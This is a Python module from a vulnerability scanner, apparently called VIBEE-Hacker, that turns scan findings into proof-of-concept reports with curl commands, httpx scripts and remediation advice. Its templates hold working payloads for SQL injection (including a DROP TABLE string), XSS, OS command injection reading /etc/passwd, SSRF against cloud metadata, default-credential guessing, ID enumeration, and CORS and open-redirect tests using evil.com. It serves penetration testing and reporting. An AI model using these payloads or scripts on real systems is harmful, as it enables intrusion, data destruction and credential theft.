"""Automatic PoC (Proof-of-Concept) generator for detected vulnerabilities."""

from __future__ import annotations

import logging
from dataclasses import dataclass
from urllib.parse import urlparse

from vibee_hacker.core.models import Result, Severity

logger = logging.getLogger(__name__)


@dataclass
class PoC:
    """A generated Proof-of-Concept for a vulnerability."""
    vuln_title: str
    vuln_type: str  # sqli, xss, cmdi, ssrf, etc.
    severity: str
    curl_command: str = ""
    python_script: str = ""
    raw_request: str = ""
    description: str = ""
    impact: str = ""
    remediation: str = ""
    verified: bool = False

    def to_dict(self) -> dict:
        return {
            "vuln_title": self.vuln_title,
            "vuln_type": self.vuln_type,
            "severity": self.severity,
            "curl_command": self.curl_command,
            "python_script": self.python_script,
            "raw_request": self.raw_request,
            "description": self.description,
            "impact": self.impact,
            "remediation": self.remediation,
            "verified": self.verified,
        }

    def to_markdown(self) -> str:
        lines = [
            f"# PoC: {self.vuln_title}",
            f"**Type:** {self.vuln_type} | **Severity:** {self.severity}",
            "",
            f"## Description\n{self.description}",
            "",
            f"## Impact\n{self.impact}",
            "",
        ]
        if self.curl_command:
            lines.extend(["## Reproduce (curl)", f"```bash\n{self.curl_command}\n```", ""])
        if self.python_script:
            lines.extend(["## Exploit Script (Python)", f"```python\n{self.python_script}\n```", ""])
        if self.raw_request:
            lines.extend(["## Raw HTTP Request", f"```http\n{self.raw_request}\n```", ""])
        lines.extend([f"## Remediation\n{self.remediation}"])
        return "\n".join(lines)


# PoC templates per vulnerability type
POC_TEMPLATES: dict[str, dict] = {
    "sqli": {
        "description": "SQL Injection allows an attacker to manipulate database queries by injecting SQL code through user input.",
        "impact": "Data exfiltration, authentication bypass, data modification, and potential remote code execution via database features.",
        "remediation": "Use parameterized queries/prepared statements. Never concatenate user input into SQL strings.",
        "payloads": ["' OR '1'='1' --", "' UNION SELECT NULL,NULL,NULL--", "1; DROP TABLE users--"],
        "curl_template": "curl -s '{url}' --data-urlencode '{param}={payload}'",
        "python_template": '''import httpx

TARGET = "{url}"
PARAM = "{param}"
PAYLOAD = "{payload}"

resp = httpx.get(TARGET, params={{PARAM: PAYLOAD}})
if "SQL" in resp.text or "error" in resp.text.lower():
    print(f"[!] SQLi confirmed: {{PARAM}}={{PAYLOAD}}")
    print(f"    Status: {{resp.status_code}}")
    print(f"    Evidence: {{resp.text[:200]}}")
else:
    print("[-] Not vulnerable or different response")
''',
    },
    "xss": {
        "description": "Cross-Site Scripting (XSS) allows injection of malicious scripts into web pages viewed by other users.",
        "impact": "Session hijacking, credential theft, defacement, malware distribution, and phishing.",
        "remediation": "Encode output, implement Content-Security-Policy, use HttpOnly cookies.",
        "payloads": ["<script>alert(document.domain)</script>", "<img src=x onerror=alert(1)>", "'\"><script>alert(1)</script>"],
        "curl_template": "curl -s '{url}' --data-urlencode '{param}={payload}'",
        "python_template": '''import httpx

TARGET = "{url}"
PARAM = "{param}"
PAYLOAD = "{payload}"

resp = httpx.get(TARGET, params={{PARAM: PAYLOAD}})
if PAYLOAD in resp.text:
    print(f"[!] XSS confirmed: payload reflected in response")
    print(f"    URL: {{TARGET}}?{{PARAM}}={{PAYLOAD}}")
else:
    print("[-] Payload not reflected")
''',
    },
    "cmdi": {
        "description": "Command Injection allows execution of arbitrary OS commands on the server.",
        "impact": "Full server compromise, data exfiltration, lateral movement, ransomware deployment.",
        "remediation": "Use subprocess with list arguments (never shell=True). Validate/sanitize all input.",
        "payloads": ["; id", "| cat /etc/passwd", "`whoami`"],
        "curl_template": "curl -s '{url}' --data-urlencode '{param}={payload}'",
        "python_template": '''import httpx

TARGET = "{url}"
PARAM = "{param}"
PAYLOAD = "{payload}"

resp = httpx.get(TARGET, params={{PARAM: PAYLOAD}})
if any(m in resp.text for m in ["uid=", "root:", "www-data"]):
    print(f"[!] Command Injection confirmed!")
    print(f"    Output: {{resp.text[:300]}}")
else:
    print("[-] Command injection not confirmed")
''',
    },
    "ssrf": {
        "description": "Server-Side Request Forgery allows the attacker to make the server send requests to internal resources.",
        "impact": "Internal network scanning, cloud metadata access (AWS/GCP keys), internal service exploitation.",
        "remediation": "Validate and allowlist URLs. Block internal IP ranges. Use a URL parser, not regex.",
        "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "http://[::1]/"],
        "curl_template": "curl -s '{url}' --data-urlencode '{param}={payload}'",
        "python_template": '''import httpx

TARGET = "{url}"
PARAM = "{param}"
PAYLOAD = "{payload}"

resp = httpx.get(TARGET, params={{PARAM: PAYLOAD}})
if resp.status_code == 200 and len(resp.text) > 0:
    print(f"[!] SSRF confirmed: server fetched internal resource")
    print(f"    Response length: {{len(resp.text)}}")
    print(f"    Content: {{resp.text[:300]}}")
''',
    },
    "idor": {
        "description": "Insecure Direct Object Reference allows accessing other users' data by manipulating object IDs.",
        "impact": "Unauthorized data access, privacy violation, data breach.",
        "remediation": "Implement server-side authorization checks. Use indirect references (UUIDs).",
        "payloads": [],
        "curl_template": "curl -s '{url}'",
        "python_template": '''import httpx

BASE_URL = "{url}"

# Enumerate IDs
for user_id in range(1, 20):
    url = BASE_URL.replace("{original_id}", str(user_id))
    resp = httpx.get(url)
    if resp.status_code == 200:
        print(f"[!] Accessible: ID={{user_id}} -> {{resp.text[:100]}}")
''',
    },
    "cors": {
        "description": "CORS misconfiguration allows malicious websites to read responses from the target API.",
        "impact": "Sensitive data theft from authenticated users via malicious websites.",
        "remediation": "Restrict Access-Control-Allow-Origin to specific trusted domains. Never reflect Origin.",
        "payloads": [],
        "curl_template": "curl -s -H 'Origin: https://evil.com' -I '{url}'",
        "python_template": '''import httpx

TARGET = "{url}"
EVIL_ORIGIN = "https://evil.com"

resp = httpx.get(TARGET, headers={{"Origin": EVIL_ORIGIN}})
acao = resp.headers.get("Access-Control-Allow-Origin", "")
acac = resp.headers.get("Access-Control-Allow-Credentials", "")

if acao == EVIL_ORIGIN or acao == "*":
    print(f"[!] CORS misconfiguration confirmed!")
    print(f"    ACAO: {{acao}}")
    print(f"    ACAC: {{acac}}")
    if acac.lower() == "true":
        print("    [!!] Credentials allowed — HIGH severity")
''',
    },
    "open_redirect": {
        "description": "Open Redirect allows redirecting users to malicious websites via a trusted domain.",
        "impact": "Phishing, OAuth token theft, reputation damage.",
        "remediation": "Validate redirect URLs against an allowlist. Don't allow external redirects.",
        "payloads": ["https://evil.com", "//evil.com", "/\\evil.com"],
        "curl_template": "curl -s -I '{url}?{param}={payload}'",
        "python_template": '''import httpx

TARGET = "{url}"
PARAM = "{param}"
EVIL_URL = "https://evil.com"

resp = httpx.get(TARGET, params={{PARAM: EVIL_URL}}, follow_redirects=False)
location = resp.headers.get("Location", "")

if "evil.com" in location:
    print(f"[!] Open redirect confirmed!")
    print(f"    Location: {{location}}")
else:
    print(f"[-] No redirect to evil.com (Location: {{location}})")
''',
    },
    "default_creds": {
        "description": "Default credentials allow unauthorized access to admin panels.",
        "impact": "Full administrative access, complete application compromise.",
        "remediation": "Change default credentials immediately. Implement account lockout and MFA.",
        "payloads": [],
        "curl_template": "curl -s -X POST '{url}' -d 'username=admin&password=admin'",
        "python_template": '''import httpx

LOGIN_URL = "{url}"
CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("admin", "123456"),
]

for username, password in CREDS:
    resp = httpx.post(LOGIN_URL, data={{"username": username, "password": password}})
    if resp.status_code == 200 and any(m in resp.text.lower() for m in ["dashboard", "welcome", "logout"]):
        print(f"[!] Default creds work: {{username}}:{{password}}")
        break
else:
    print("[-] No default credentials found")
''',
    },
}

# Map plugin names to vuln types
PLUGIN_TO_TYPE: dict[str, str] = {
    "sqli": "sqli",
    "xss": "xss",
    "cmdi": "cmdi",
    "ssrf": "ssrf",
    "ssti": "cmdi",
    "idor_check": "idor",
    "cors_check": "cors",
    "open_redirect": "open_redirect",
    "default_creds": "default_creds",
    "nosql_injection": "sqli",
    "xxe": "ssrf",
    "path_traversal": "cmdi",
    "crlf_injection": "xss",
}

_SEVERITY_NAMES: dict[Severity, str] = {
    Severity.CRITICAL: "CRITICAL",
    Severity.HIGH: "HIGH",
    Severity.MEDIUM: "MEDIUM",
    Severity.LOW: "LOW",
    Severity.INFO: "INFO",
}


class PoCGenerator:
    """Generates PoCs for detected vulnerabilities."""

    def __init__(self) -> None:
        self._templates: dict[str, dict] = dict(POC_TEMPLATES)

    def generate(self, result: Result) -> PoC | None:
        """Generate a PoC for a scan result. Returns None for unsupported types."""
        vuln_type = PLUGIN_TO_TYPE.get(result.plugin_name, "")
        if not vuln_type or vuln_type not in self._templates:
            return None

        template = self._templates[vuln_type]
        endpoint = result.endpoint or ""
        param = result.param_name or "input"
        payload = template["payloads"][0] if template["payloads"] else ""

        # Build curl command
        curl_cmd = template.get("curl_template", "").format(
            url=endpoint,
            param=param,
            payload=payload,
        )

        # Build Python script
        python_script = template.get("python_template", "").format(
            url=endpoint,
            param=param,
            payload=payload,
            original_id="1",
        )

        # Build raw HTTP request
        parsed = urlparse(endpoint)
        method = "GET"
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"
        host = parsed.netloc or "target.com"

        raw_request = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: VIBEE-Hacker/2.2.0\r\n"
            f"Accept: */*\r\n"
            f"\r\n"
        )

        severity_name = _SEVERITY_NAMES.get(result.base_severity, "UNKNOWN")

        return PoC(
            vuln_title=result.title,
            vuln_type=vuln_type,
            severity=severity_name,
            curl_command=curl_cmd,
            python_script=python_script,
            raw_request=raw_request,
            description=template["description"],
            impact=template["impact"],
            remediation=template["remediation"],
        )

    def generate_all(self, results: list[Result]) -> list[PoC]:
        """Generate PoCs for all applicable results."""
        pocs: list[PoC] = []
        for result in results:
            poc = self.generate(result)
            if poc:
                pocs.append(poc)
        return pocs

    def generate_report(self, pocs: list[PoC]) -> str:
        """Generate a combined Markdown report of all PoCs."""
        if not pocs:
            return "# No PoCs generated\n\nNo exploitable vulnerabilities found."

        sections = [
            "# VIBEE-Hacker — PoC Report",
            f"\n**Total PoCs:** {len(pocs)}\n",
        ]
        for i, poc in enumerate(pocs, 1):
            sections.append(f"---\n\n## {i}. {poc.vuln_title}\n")
            sections.append(poc.to_markdown())
        return "\n".join(sections)

    @property
    def supported_types(self) -> list[str]:
        """Return all supported vulnerability type keys."""
        return list(self._templates.keys())
